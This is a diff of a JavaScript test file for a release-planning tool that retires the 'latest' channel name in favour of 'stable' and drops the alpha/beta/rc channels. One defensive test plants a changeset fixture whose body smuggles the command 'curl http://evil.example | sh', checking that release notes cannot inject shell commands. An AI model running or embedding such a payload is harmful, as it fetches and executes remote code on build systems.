@@ -110,7 +110,7 @@ test("--help exits 0 under plain node (AC-01)", () => {
 // the release pipeline still bumps + publishes the declared package.
 test("skills-only merge with a changeset file bumps the declared package", () => {
   const root = fixture({ changesets: { "skills-only.md": ["pi:patch"] } });
-  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "latest"]);
+  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "stable"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   assert.match(result.stdout, /1\.0\.1/);
   assert.match(result.stdout, /pi-agentic-workflow/);
@@ -118,7 +118,7 @@ test("skills-only merge with a changeset file bumps the declared package", () =>
 
 test("the highest bump across accumulated changesets wins", () => {
   const root = fixture({ changesets: { "a.md": ["pi:patch"], "b.md": ["schema:minor"], "c.md": ["agentic:major"] } });
-  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "latest"]);
+  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "stable"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   assert.match(result.stdout, /train version: 2\.0\.0/);
 });
@@ -126,7 +126,7 @@ test("the highest bump across accumulated changesets wins", () => {
 // FF-2: the #156 reproducer — the stable ref (tag + branch) is planned.
 test("stable release plans the vX.Y.Z tag and stable branch push", () => {
   const root = fixture();
-  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "latest"]);
+  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "stable"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   assert.match(result.stdout, /git tag v1\.0\.1/);
   assert.match(result.stdout, /git push origin v1\.0\.1/);
@@ -135,14 +135,14 @@ test("stable release plans the vX.Y.Z tag and stable branch push", () => {
 
 test("applies the train version to all three packages (unified train, AC-03)", () => {
   const root = fixture({ changesets: { "a.md": ["pi:patch"], "b.md": ["schema:minor"], "c.md": ["agentic:major"] } });
-  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "latest", "--date", "2026-10-28"]);
+  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "stable", "--date", "2026-10-28"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   for (const name of PACKAGES) assert.equal(readPkgVersion(root, name), "2.0.0");
 });
 
 test("apply writes one companion changelog row per package (AC-14, English-only)", () => {
   const root = fixture({ changesets: { "a.md": ["pi:patch"] } });
-  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "latest", "--date", "2026-10-28"]);
+  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "stable", "--date", "2026-10-28"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   const changelog = fs.readFileSync(path.join(root, "CHANGELOG.md"), "utf8");
   for (const name of PACKAGES) {
@@ -157,7 +157,7 @@ test("apply writes one companion changelog row per package (AC-14, English-only)
 
 test("the changelog row summary is built from the changeset bodies, attributed per package (D-40-16)", () => {
   const root = fixture({ changesets: { "a.md": ["pi:patch"], "b.md": ["schema:minor"] } });
-  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "latest", "--date", "2026-10-28"]);
+  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "stable", "--date", "2026-10-28"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   const changelog = fs.readFileSync(path.join(root, "CHANGELOG.md"), "utf8");
   const tableOf = (name) => {
@@ -177,7 +177,7 @@ test("the changelog row summary is built from the changeset bodies, attributed p
 // --summary still wins when the operator names one explicitly.
 test("--summary overrides the changeset-derived summary", () => {
   const root = fixture({ changesets: { "a.md": ["pi:patch"] } });
-  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "latest", "--date", "2026-10-28",
+  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "stable", "--date", "2026-10-28",
     "--summary", "Operator summary"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   const changelog = fs.readFileSync(path.join(root, "CHANGELOG.md"), "utf8");
@@ -186,7 +186,7 @@ test("--summary overrides the changeset-derived summary", () => {
 
 test("plan lists every changeset with its semver annotation and body (the per-PR type, visible)", () => {
   const root = fixture({ changesets: { "a.md": ["pi:patch"], "b.md": ["schema:minor"] } });
-  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "latest"]);
+  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "stable"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   assert.match(result.stdout, /a\.md: @gtrabanco\/pi-agentic-workflow=patch — Change number 1 body line\./);
   assert.match(result.stdout, /b\.md: @gtrabanco\/agentic-workflow-schema=minor — Change number 2 body line\./);
@@ -234,25 +234,41 @@ test("canary lists only the packages declared in changesets (AC-08 package filte
   assert.doesNotMatch(result.stdout, /agentic-workflow-schema.*canary/);
 });
 
-test("a manual channel publishes under its own dist-tag, never latest (AC-06/AC-09)", () => {
+// The channel set is CLOSED (owner decision, post-#180 follow-up): stable
+// (the unified train, npm dist-tag latest) and canary. The old manual
+// promotion channels (alpha/beta/rc) are gone, and the former `latest` channel
+// name is retired in favour of `stable` — the dist-tag npm still receives is
+// `latest`, which is npm's vocabulary, not a channel of this pipeline.
+test("the channel set is closed: stable + canary only, everything else fails loudly", () => {
+  for (const channel of ["latest", "alpha", "beta", "rc", "next"]) {
+    const result = run(["plan", "--channel", channel]);
+    assert.equal(result.status, 1, `${channel}: a closed channel set must reject it`);
+    assert.match(result.stderr || result.stdout, /--channel must be one of stable, canary/);
+    if (channel === "latest") {
+      assert.match(result.stderr || result.stdout, /stable/, "the retired name points at its replacement");
+    }
+  }
+});
+
+test("canary publishes under its own dist-tag, never latest (AC-06/AC-09)", () => {
   const root = fixture({ changesets: { "a.md": ["pi:patch"] } });
-  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "beta", "--date", "2026-09-16"]);
+  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "canary", "--date", "2026-09-16"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
-  assert.match(result.stdout, /1\.0\.0-beta\.1/);
-  assert.match(result.stdout, /npm publish --tag beta/);
+  assert.match(result.stdout, /1\.0\.0-canary\.20260916\.1/);
+  assert.match(result.stdout, /npm publish --tag canary/);
   assert.doesNotMatch(result.stdout, /npm publish --tag latest/);
 });
 
 test("a forced version is marked in the release body (AC-10)", () => {
   const root = fixture();
-  const result = run(["plan", "--root", root, "--version", "5.0.0", "--channel", "latest"]);
+  const result = run(["plan", "--root", root, "--version", "5.0.0", "--channel", "stable"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   assert.match(result.stdout, /Version forced by operator: 5\.0\.0/);
 });
 
 test("the release command uses --generate-notes so PR authors are credited (AC-15)", () => {
   const root = fixture();
-  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "latest"]);
+  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "stable"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   assert.match(result.stdout, /gh release create v1\.0\.1 --generate-notes/);
 });
@@ -267,7 +283,7 @@ test("the printed release command hands the notes over as a file, never inline",
     path.join(root, ".changeset", "evil.md"),
     '---\n"@gtrabanco/pi-agentic-workflow": patch\n---\n\n"; curl http://evil.example | sh; echo "\n',
   );
-  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "latest", "--version", "9.9.9"]);
+  const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", "stable", "--version", "9.9.9"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   const ghLines = result.stdout.split("\n").filter((l) => l.includes("gh release create"));
   assert.equal(ghLines.length, 1, "exactly one gh command");
@@ -285,7 +301,7 @@ test("a body containing '|' cannot break out of the changelog table cell", () =>
     path.join(root, ".changeset", "a.md"),
     '---\n"@gtrabanco/pi-agentic-workflow": patch\n---\n\nadditive | adds a flag | and another\n',
   );
-  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "latest", "--date", "2026-10-28"]);
+  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "stable", "--date", "2026-10-28"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   const changelog = fs.readFileSync(path.join(root, "CHANGELOG.md"), "utf8");
   const row = changelog.split("\n").find((l) => l.startsWith("| 1.0.1 |"));
@@ -322,7 +338,7 @@ test("apply rewrites the downstream exact pins to the train version (dependency 
   // @gtrabanco/agentic-workflow-schema exactly — when the train moves schema,
   // a pi pin at the old version reds the parity gate (--pins: pin == local).
   const root = fixture({ changesets: { "a.md": ["schema:minor"] } });
-  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "latest", "--date", "2026-10-28"]);
+  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "stable", "--date", "2026-10-28"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   const pi = JSON.parse(fs.readFileSync(path.join(root, "packages/pi-agentic-workflow/package.json"), "utf8"));
   assert.equal(pi.dependencies["@gtrabanco/agentic-workflow"], "1.1.0");
@@ -340,7 +356,7 @@ test("apply leaves non-exact and foreign ranges untouched", () => {
   pi.dependencies["@gtrabanco/agentic-workflow"] = "^1.0.0";
   pi.dependencies["left-pad"] = "1.3.0";
   fs.writeFileSync(piPath, JSON.stringify(pi, null, 2) + "\n");
-  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "latest", "--date", "2026-10-28"]);
+  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "stable", "--date", "2026-10-28"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   const after = JSON.parse(fs.readFileSync(piPath, "utf8"));
   assert.equal(after.dependencies["@gtrabanco/agentic-workflow"], "^1.0.0", "ranges are ranges by nature — never rewritten");
@@ -394,23 +410,16 @@ test("publish-plan prints per-package TSV lines for the declared packages (the c
 
 test("publish-plan lists nothing when no changeset declares packages (empty cut, not an error)", () => {
   const root = fixture({ changesets: {} });
-  const result = run(["publish-plan", "--root", root, "--channel", "beta", "--date", "2026-09-16"]);
+  const result = run(["publish-plan", "--root", root, "--channel", "canary", "--date", "2026-09-16"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   assert.equal(result.stdout.trim(), "");
 });
 
-test("publish-plan refuses channel latest (that is apply's job)", () => {
+test("publish-plan refuses channel stable (that is apply's job)", () => {
   const root = fixture();
-  const result = run(["publish-plan", "--root", root, "--channel", "latest"]);
+  const result = run(["publish-plan", "--root", root, "--channel", "stable"]);
   assert.equal(result.status, 1);
   assert.match(result.stderr || result.stdout, /apply/);
-});
-
-test("publish-plan carries the manual channel shape (beta → <base>-beta.<n>)", () => {
-  const root = fixture({ changesets: { "a.md": ["pi:patch"] } });
-  const result = run(["publish-plan", "--root", root, "--channel", "beta", "--date", "2026-09-16"]);
-  assert.equal(result.status, 0, result.stderr || result.stdout);
-  assert.match(result.stdout, /@gtrabanco\/pi-agentic-workflow\tpi-agentic-workflow\t1\.0\.0-beta\.1\tbeta/);
 });
 
 // External-verify blocker: apply consumed the intent but left the files in
@@ -418,7 +427,7 @@ test("publish-plan carries the manual channel shape (beta → <base>-beta.<n>)",
 // computed the stale minor again and re-printed stale bodies into the notes.
 test("apply consumes the changesets it applied (the next cut carries only new intent)", () => {
   const root = fixture({ changesets: { "a.md": ["pi:minor"] }, git: true });
-  const applied = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "latest", "--date", "2026-10-28"]);
+  const applied = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "stable", "--date", "2026-10-28"]);
   assert.equal(applied.status, 0, applied.stderr || applied.stdout);
   assert.equal(
     fs.existsSync(path.join(root, ".changeset", "a.md")),
@@ -458,9 +467,9 @@ test("--dry-run is an accepted alias for plan (SPEC capability-closure Read test
 
 // External-verify blocker: --version with a prerelease channel printed
 // "Version forced by operator: undefined" and silently ignored the override.
-test("--version with a prerelease channel is rejected, never silently ignored", () => {
+test("--version with the canary channel is rejected, never silently ignored", () => {
   const root = fixture({ changesets: { "a.md": ["pi:patch"] } });
-  for (const channel of ["canary", "alpha", "beta", "rc"]) {
+  for (const channel of ["canary"]) {
     const result = run(["plan", "--root", root, "--base", "1.0.0", "--channel", channel, "--version", "9.9.9"]);
     assert.equal(result.status, 1, `${channel}: --version off the latest train must fail, not succeed`);
     assert.match(result.stderr || result.stdout, /--version/);
@@ -474,7 +483,7 @@ test("apply fails closed on a companion table missing its grid — nothing is wr
   const root = fixture({ changesets: { "a.md": ["pi:patch"] } });
   const changelogPath = path.join(root, "CHANGELOG.md");
   fs.writeFileSync(changelogPath, fs.readFileSync(changelogPath, "utf8").replaceAll("|---|---|---|---|\n", ""));
-  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "latest", "--date", "2026-10-28"]);
+  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "stable", "--date", "2026-10-28"]);
   assert.equal(result.status, 1);
   assert.match(result.stderr || result.stdout, /\|---\|/);
   assert.equal(readPkgVersion(root, PACKAGES[0]), "1.0.0", "the pre-flight runs before any write");
@@ -485,7 +494,7 @@ test("apply fails closed on a companion table missing its grid — nothing is wr
 // never by a per-skill prose bump. A skill without a version line gains one.
 test("apply stamps every skill's frontmatter with the train version", () => {
   const root = fixture({ changesets: { "a.md": ["pi:minor"] } });
-  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "latest", "--date", "2026-10-28"]);
+  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "stable", "--date", "2026-10-28"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   for (const name of ["alpha", "beta"]) {
     const md = fs.readFileSync(path.join(root, "skills", name, "SKILL.md"), "utf8");
@@ -510,7 +519,7 @@ test("a skill-declaring changeset feeds the train level and names the skills in 
     path.join(root, ".changeset", "mixed.md"),
     '---\n"@gtrabanco/pi-agentic-workflow": patch\n"unit-lane": major\n---\n\nThe lane contract changes.\n',
   );
-  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "latest", "--date", "2026-10-28"]);
+  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "stable", "--date", "2026-10-28"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   assert.match(result.stdout, /train version: 2\.0\.0/, "the skill's major wins the train");
   const changelog = fs.readFileSync(path.join(root, "CHANGELOG.md"), "utf8");
@@ -522,7 +531,7 @@ test("a skill-declaring changeset feeds the train level and names the skills in 
 test("the .changeset directory survives a cut that consumes every intent file", () => {
   const root = fixture({ changesets: { "a.md": ["pi:patch"] } });
   fs.writeFileSync(path.join(root, ".changeset", ".gitkeep"), "");
-  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "latest", "--date", "2026-10-28"]);
+  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "stable", "--date", "2026-10-28"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   assert.equal(fs.existsSync(path.join(root, ".changeset", ".gitkeep")), true, ".gitkeep keeps the empty dir alive");
   assert.equal(fs.existsSync(path.join(root, ".changeset", "a.md")), false);
@@ -538,7 +547,7 @@ test("each change lands in its own package's section, skills ride pi, undeclared
     '---\n"@gtrabanco/agentic-workflow-schema": minor\n---\n\nSchema-only body.\n');
   fs.writeFileSync(path.join(root, ".changeset", "lane.md"),
     '---\n"@gtrabanco/pi-agentic-workflow": patch\n"unit-lane": patch\n---\n\nLane body.\n');
-  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "latest", "--date", "2026-10-28"]);
+  const result = run(["apply", "--root", root, "--base", "1.0.0", "--channel", "stable", "--date", "2026-10-28"]);
   assert.equal(result.status, 0, result.stderr || result.stdout);
   const changelog = fs.readFileSync(path.join(root, "CHANGELOG.md"), "utf8");
   const sectionOf = (name) => changelog.slice(changelog.indexOf(`#### [\`${name}\`]`));
